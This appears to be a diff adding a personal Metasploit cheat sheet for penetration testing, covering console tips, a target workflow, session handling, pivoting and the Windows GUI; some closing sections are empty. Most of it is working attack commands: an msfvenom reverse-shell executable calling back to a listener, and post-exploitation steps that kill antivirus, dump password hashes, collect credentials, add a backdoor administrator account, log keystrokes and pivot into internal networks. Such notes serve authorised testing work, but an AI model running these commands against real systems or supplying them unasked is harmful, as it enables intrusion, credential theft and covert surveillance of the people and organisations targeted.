@@ -1,0 +1,144 @@
+#=============
+# Metasploit CLI (Linux)
+#=============
+--- Tips ---
+[Tab] key works like Cisco or Linux CLI
+type "back" to lower a command prompt level
+"help" shows relevant tool commands
+"unset" removes a value from a set command "unset RHOST"
+"setg" sets a global variable (setg LHOST [your listening host ip]), pairs with unsetg
+"exit" drops you from a local shell back to meterpreter
+set DisableCourtesyShell TRUE
+set ViewOnly FALSE
+"exploit -z" - run exploit in background
+"db_export [filename]" outputs to /root by default
+db_import [filename], db_status
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=[listener IP] LPORT=443 -f exe > /output/metasploit/shell.exe
+
+
+--- Loading Metasploit ---
+service postgresql start
+msfdbinit
+msfconsole
+
+--- Basic target workflow ---
+db_status (or other db connect/import/export etc)
+db_nmap (nmap flags and target IPs or CIDRs, -iL Windows dirs must be double-slashed)
+services -u (optional: give IP)
+hosts
+search [windows/linux/smb/etc.]
+use /exploits/[whatever]
+show targets (if it isn't for your target, find a new exploit)
+show options
+set RHOST [remote IP or range]
+set LHOST [listening IP or range]
+show payloads
+set PAYLOAD windows/meterpreter/reverse_tcp (or whatever payload)
+show options
+run (or "exploit" does the same thing)
+...if "meterpreter>" appears, proceed to Actions on Objectives
+getwd
+run post/windows/gather/checkvm
+run getcountermeasure
+run post/windows/manage/killav
+run get_local_subnets
+run post/multi/manage/autoroute
+run post/windows/gather/enum_applications
+run credcollect
+run post/windows/gather/smart_hashdump
+run getsystem
+shell (opens cmd prompt as system even if you didn't do run getsystem)
+cd \
+ipconfig /all
+net user
+net localgroup administrators
+net user haxxor letmein /add
+net localgroup administrators /add haxxor
+(if administrator account is now inactive, do "net user administrator /enable:yes")
+keyscan_start
+-keyscan_dump (as needed, only shows since last dump)
+
+
+--- PID Migration ---
+(post exploitation at meterpreter shell)
+ps (lists pids on compromised host)
+getpid (lists meterpreter's pids)
+migrate xyz (migrates met's process to a new pid)
+
+
+--- Managing Sessions ---
+(get a shell)
+background (sends to bg)
+sessions (displays active sessions)
+set SESSION x (num of session)
+sessions -i x (num of session to re-engage)
+
+
+--- Autoroute Through Infrastructure ---
+pop a meterpreter shell
+background, sessions (note #)
+use post/multi/manage/autoroute
+set session #
+show options, run
+sessions -i #
+ipconfig (note additional subnets added with autoroute)
+getsystem, hashdump, background
+use auxiliary/scanner/portscan/tcp
+set RHOSTS (internal network)
+set RPORTS (ports of choice)
+set THREADS 50
+run
+
+
+
+--- Modules ---
+search scanners/[smb, etc]
+use auxiliary/scanner/smb/smb_version
+show options
+set RHOST [remote IP or range]
+set LHOST [listening IP or range]
+run
+
+
+
+
+
+
+
+#=============
+# Metasploit GUI (Windows)
+#=============
+--- Loading Metasploit ---
+Start --> Access Metasploit UI
+Start --> Metasploit Console
+
+--- Quick PenTest ---
+Load IPs
+Configure exploit level
+Set report email address
+Start
+Review results (Overview, Analysis, etc)
+
+--- New Project ---
+Set name, description
+Set IP ranges (this cannot be changed later)
+Scan --> New Discovery Scan --> Advanced Options
+Ignore your own IP
+
+
+#=============
+# msf > help
+#=============
+
+
+
+
+
+
+
+
+
+#=============
+# 
+#=============
+---  ---
